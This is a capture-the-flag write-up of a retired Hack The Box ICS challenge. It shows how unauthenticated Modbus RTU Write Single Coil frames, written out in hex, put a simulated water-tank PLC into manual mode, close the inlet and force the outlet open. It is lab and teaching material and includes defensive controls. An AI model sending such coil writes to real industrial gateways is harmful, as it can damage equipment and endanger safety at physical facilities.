---
title: "Hack The Box Challenge — Factory"
summary: "Factory exposes an unauthenticated Modbus RTU bridge, allowing PLC mode and valve coils to be manipulated by following the supplied ladder logic."
platform: "Hack The Box"
contentType: "challenge"
publicationPolicy: "retired"
challengeCategory: "Hardware"
difficulty: "Easy"
solvedAt: 2026-09-20
publishedAt: 2026-09-20
tags:
  - ics-security
  - ot-security
  - modbus-rtu
  - plc
  - ladder-logic
  - coil-manipulation
  - process-control
tools:
  - unzip
  - Netcat
  - Nmap
  - Socat
cves: []
htbUrl: "https://app.hackthebox.com/challenges/Factory"
cover: "/images/writeups/hackthebox/challenges/shared/hackthebox-challenge-cover.webp"
coverAlt: "Abstract cybersecurity challenge medallion with terminal, puzzle and network motifs"
featured: false
draft: false
---

> **Authorized-lab notice:** This write-up documents work performed against the isolated Hack The Box Factory challenge instance. Publication proceeded at the portfolio owner's explicit direction without an independent challenge-status lookup. The real flag, ephemeral target address, local username and unrelated sensitive information have been removed. The original challenge package is not redistributed.

More Hack The Box material is available in the [write-ups archive](/writeups/) and the focused [Challenges archive](/writeups/challenges/).

## Executive summary

Factory simulates a water-storage facility whose corrupted high- and low-level sensors have left the process in an unsafe state: the inlet valve is open, the outlet valve is closed and the tank is at risk of overflowing. The supplied network diagram exposes a remote interface that forwards attacker-supplied Modbus commands to a serial PLC network, while the supplied ladder diagram documents the PLC's control logic and coil names.

The weakness is an unauthenticated control path into the PLC. The remote interface accepts raw Modbus RTU request data without requiring an operator identity or authorization check. By converting the documented decimal coil addresses to hexadecimal and using Function Code `0x05` (Write Single Coil), I switched the controller into manual mode, asserted the inlet cutoff and forced the outlet valve to start. The final status showed the inlet closed, the outlet open and the challenge flag present.

This was not memory corruption or a conventional software exploit. It was abuse of legitimate industrial-control operations through an exposed, unauthenticated gateway, guided by the process's ladder logic.

## Challenge information

| Item | Value |
| --- | --- |
| Name | `Factory` |
| Platform | Hack The Box |
| Portfolio category | Hardware |
| Difficulty | Easy |
| Core weakness | Unauthenticated Modbus coil writes |
| Target protocol | Modbus RTU through a TCP-accessible remote interface |
| Operational goal | Stop inflow and drain the water tank |

## Provided material and evidence boundaries

The downloaded archive contained two supplied artifacts:

```text
Factory.zip
├── interface_setup.png
└── PLC_Ladder_Logic.pdf
```

The archive and original artifacts remain outside this public repository. Their hashes identify the exact evidence reviewed during the solve:

```text
6206cb118d0e2d11ebe7bd40529f0eb4b423fd3835f53ccf5809476178bacc79  Factory.zip
e6f659fbfd2ea34bd1e894e0ff959254912e66b1162c6401ecfad32e85069648  interface_setup.png
9913582796f25e065b8bcade5fdeba8a8747d627b5922ef6d489ea32cc7b088e  PLC_Ladder_Logic.pdf
```

`interface_setup.png` documents the control path:

```text
Operator host -> remote interface -> serial Modbus RTU network -> PLC-1
```

PLC-1 uses decimal slave address `82`, which is `0x52` in hexadecimal. The intermediate system calculates the RTU CRC and forwards a valid packet, so the interface expects the request bytes without a CRC suffix.

The same diagram provides the relevant coil map:

| Decimal address | Hex address | Coil |
| ---: | ---: | --- |
| 5 | `0x0005` | `cutoff` |
| 12 | `0x000C` | `in_valve` |
| 21 | `0x0015` | `out_valve` |
| 26 | `0x001A` | `cutoff_in` |
| 33 | `0x0021` | `start` |
| 52 | `0x0034` | `force_start_out` |
| 1336 | `0x0538` | `force_start_in` |
| 9947 | `0x26DB` | `manual_mode_control` |

The one-page PDF contains the `water_storage_facility` ladder program. Its rungs explain the state transitions that matter for the solve:

- `auto_mode` is self-held through a normally closed `manual_mode_control` contact.
- When `manual_mode_control` opens that path, `auto_mode` drops out.
- A normally closed `auto_mode` contact then energizes `manual_mode`.
- `cutoff_in` combined with `manual_mode` energizes `stop_in`, which prevents `in_valve` from energizing.
- `force_start_out` combined with `manual_mode` provides a parallel path that energizes `out_valve`.
- Reset coils clear the manual overrides whenever `manual_mode` is false, so entering manual mode is essential before relying on those overrides.

## Initial connection and a stale instance

The first challenge endpoint completed a TCP handshake but never displayed the expected application menu:

```bash
nc -nv <TARGET> <OLD_PORT>
```

```text
(UNKNOWN) [<TARGET>] <OLD_PORT> (?) open
```

Sending menu option `1` with both LF and CRLF line endings produced no response:

```bash
printf '1\n' | nc -nv -w 3 <TARGET> <OLD_PORT>
printf '1\r\n' | nc -nv -w 3 <TARGET> <OLD_PORT>
```

Installing Socat and using a raw terminal did not change the result:

```bash
sudo apt install socat
socat -,rawer,echo=0 TCP:<TARGET>:<OLD_PORT>
```

This behavior initially looked like a framing or terminal-buffering problem, but no application data arrived at all. Restarting the HTB instance allocated a new port. A later Nmap check against the old endpoint confirmed that it had closed:

```bash
nmap -Pn -sV --script=banner -p <OLD_PORT> <TARGET>
```

```text
PORT             STATE  SERVICE
<OLD_PORT>/tcp   closed unknown
```

Connecting to the fresh endpoint immediately produced the real interface:

```bash
nc -nv <TARGET> <PORT>
```

```text
Water Storage Facility Interface

1. Get status of system
2. Send modbus command
3. Exit
Select:
```

The failed attempts were therefore an instance-lifecycle issue, not evidence that the service expected TLS, raw Modbus/TCP or a different line ending.

## Establishing the unsafe process state

Selecting option `1` returned the initial PLC state:

```json
{
  "auto_mode": 1,
  "manual_mode": 0,
  "stop_out": 0,
  "stop_in": 0,
  "low_sensor": 0,
  "high_sesnor": 0,
  "in_valve": 1,
  "out_valve": 0,
  "flag": "HTB{}"
}
```

The service's `high_sesnor` spelling is preserved above. Both sensor values were zero, automatic mode was active, the inlet was open and the outlet was closed. This matched the unsafe state described by the scenario.

## Identifying the control weakness

The remote interface's second menu option accepts a hexadecimal Modbus command and forwards it into the serial network. A Write Single Coil request has the relevant structure:

```text
[slave:1][function:1][address:2][value:2]
```

For this target:

```text
slave    = 52       # decimal slave address 82
function = 05       # Write Single Coil
value    = FF00     # ON
```

For example, writing `manual_mode_control` at decimal address `9947` (`0x26DB`) produces:

```text
52 05 26DB FF00
```

or, as the interface expects it:

```text
520526DBFF00
```

No CRC bytes are appended because the supplied network diagram explicitly assigns CRC calculation to the intermediate remote interface.

The security failure is the lack of an authorization boundary between a network client and safety-relevant PLC coils. The interface exposes a valid engineering operation, but it does not verify whether the sender is an authorized operator or whether changing the requested coil is safe for the process.

## Chronological solution

### 1. Entering manual mode

I selected menu option `2` and wrote `manual_mode_control`:

```text
Modbus command: 520526DBFF00
Modbus command sent to the network!
```

This opens the normally closed `manual_mode_control` contact in the top rung. The `auto_mode` coil loses its self-holding path, and the following rung energizes `manual_mode` through its normally closed `auto_mode` contact.

### 2. The executed but unnecessary `start` write

The next command in the live solve set the documented `start` coil:

```text
Modbus command: 52050021FF00
Modbus command sent to the network!
```

This command was accepted, but later review of the supplied ladder diagram showed that it was not required after `manual_mode_control` had already been asserted. The `start` contact can initiate the automatic-mode rung only while the normally closed `manual_mode_control` contact remains closed. With manual control active, that path is interrupted.

The write is retained here because it was genuinely executed, but it should not be mistaken for a necessary part of the minimal solution.

### 3. Stopping the inlet

The inlet cutoff is decimal coil `26`, or `0x001A`:

```text
Modbus command: 5205001AFF00
Modbus command sent to the network!
```

With `manual_mode` energized, `cutoff_in` energizes `stop_in`. The `stop_in` contact in the inlet-valve rung then blocks `in_valve`, stopping additional water from entering the tank.

### 4. Forcing the outlet open

The output override is decimal coil `52`, or `0x0034`:

```text
Modbus command: 52050034FF00
Modbus command sent to the network!
```

The `force_start_out` and `manual_mode` contacts create a parallel path around the sensor-controlled portion of the outlet rung. This energizes `out_valve` even though the corrupted sensor state cannot operate the normal automatic path.

The complete sequence executed during the successful session was:

```text
520526DBFF00
52050021FF00  # accepted but unnecessary
5205001AFF00
52050034FF00
```

The minimal sequence derived from the ladder logic is therefore:

```text
520526DBFF00
5205001AFF00
52050034FF00
```

Only the four-command sequence was remotely verified during this solve. The three-command form is a reconstruction from the supplied ladder diagram and was not separately executed against the instance.

## Validation

Selecting status option `1` after the four writes returned:

```json
{
  "auto_mode": 0,
  "manual_mode": 1,
  "stop_out": 0,
  "stop_in": 1,
  "low_sensor": 0,
  "high_sesnor": 0,
  "in_valve": 0,
  "out_valve": 1,
  "flag": "HTB{<REDACTED_FLAG>}"
}
```

The result verifies every operational objective:

| Property | Initial | Final | Meaning |
| --- | ---: | ---: | --- |
| `auto_mode` | 1 | 0 | Corrupted automatic control disabled |
| `manual_mode` | 0 | 1 | Manual override path active |
| `stop_in` | 0 | 1 | Inlet cutoff asserted |
| `in_valve` | 1 | 0 | Water inflow stopped |
| `out_valve` | 0 | 1 | Tank draining |

The service also returned an HTB-formatted flag. Its value is intentionally redacted from this public article.

## Failed approaches and evidence limits

The only failed path was troubleshooting the stale first endpoint. Netcat connected at the TCP layer, but neither interactive input, piped LF/CRLF input nor Socat produced application data. Restarting the instance resolved the issue; changing Modbus framing was unnecessary.

No automated solver was created. The successful exploit was performed manually through the supplied text interface, and the article does not present an unexecuted script as verified work.

A public community analysis was consulted during troubleshooting to cross-check the Function Code `0x05` frame shape and address conversions. The actual coil map and CRC responsibility were independently confirmed from `interface_setup.png`, the control transitions were verified from `PLC_Ladder_Logic.pdf`, and the four commands were then validated against the live HTB service.

## Why the attack works

Modbus was designed for simple and deterministic industrial communication, often in environments where network access itself was treated as the trust boundary. In this challenge, the remote interface carries that assumption onto a reachable TCP service. It translates client-supplied bytes into a valid Modbus RTU request and adds the CRC, but it does not authenticate the client or restrict writes to safety-relevant coils.

The attacker does not bypass the ladder program. Instead, the attacker understands and deliberately satisfies it:

```text
manual_mode_control ON
        |
        v
auto_mode OFF -> manual_mode ON
                       |
             +---------+----------+
             |                    |
       cutoff_in ON       force_start_out ON
             |                    |
          stop_in ON          out_valve ON
             |
         in_valve OFF
```

This is best described as unauthenticated Modbus command injection combined with PLC coil manipulation and ladder-logic abuse. Every request is syntactically valid; the vulnerability is that an untrusted party can issue it.

## Defensive perspective

| Weakness | Defensive control |
| --- | --- |
| Reachable PLC command gateway | Place the gateway on a segmented OT network and permit only approved engineering or HMI hosts |
| No client authentication | Require mutually authenticated access at the gateway before forwarding any command |
| Unrestricted Function `0x05` writes | Enforce role- and address-based allow-lists for write-capable function codes |
| Remote access to manual overrides | Separate operational override authority from ordinary monitoring access |
| No command integrity beyond CRC | Use a secure tunnel or authenticated industrial gateway; CRC detects transmission errors, not malicious modification |
| Unsafe sensor-failure outcome | Design fail-safe states so loss or corruption of level sensors cannot leave inflow active while drainage is disabled |
| Limited visibility | Alert on mode changes, manual overrides and writes to `cutoff` or `force_start` coils |

In a real facility, direct writes can affect equipment, safety and availability. Testing should begin passively, use a documented maintenance window, coordinate with process owners and include a known-safe recovery procedure.

## Key takeaways

- Read both the network diagram and the ladder logic before sending industrial-control writes.
- Convert decimal PLC addresses carefully and preserve byte order when constructing Modbus requests.
- A successful TCP handshake does not prove the application behind a challenge endpoint is healthy.
- Modbus CRC provides error detection, not authentication or authorization.
- Industrial attacks often abuse legitimate control functions rather than exploiting memory-safety flaws.
- Verify physical-process objectives through state changes, not merely through a returned flag.
- Separate executed steps from logic-derived optimizations; here, the `start` write succeeded but was unnecessary.

## References

- [Hack The Box — Factory](https://app.hackthebox.com/challenges/Factory)
- Supplied `interface_setup.png` and `PLC_Ladder_Logic.pdf` artifacts (not redistributed)
- [CTF Base — Factory](https://ctfbase.com/writeup/20260203_hackthebox_factory) — consulted for protocol cross-checking; commands and outcomes were independently validated against the supplied artifacts and live service
